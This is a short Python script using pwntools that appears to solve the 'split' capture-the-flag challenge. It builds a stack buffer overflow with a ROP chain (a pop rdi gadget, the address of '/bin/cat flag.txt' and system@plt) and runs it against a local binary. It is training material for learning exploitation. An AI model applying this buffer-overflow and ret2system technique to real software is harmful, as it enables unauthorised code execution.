# type: ignore
from pwn import *


elf = ELF("./split")
rop = ROP("./split")


if args.REMOTE:
    p = process("./split")
    payload = b"A" * 40
    payload += p64(rop.rdi[0])
    payload += p64(next(elf.search(b"/bin/cat flag.txt")))
    payload += p64(elf.plt["system"])

    p.sendlineafter(b"> ", payload)

    out = p.recvall()
    print(out)

else:
    p = process("./split")
    payload = b"A" * 40
    payload += p64(rop.find_gadget(["ret"]).address)
    payload += p64(rop.rdi[0])
    payload += p64(next(elf.search(b"/bin/cat flag.txt")))
    payload += p64(elf.plt["system"])

    p.sendlineafter(b"> ", payload)

    out = p.recvall()
    print(out)
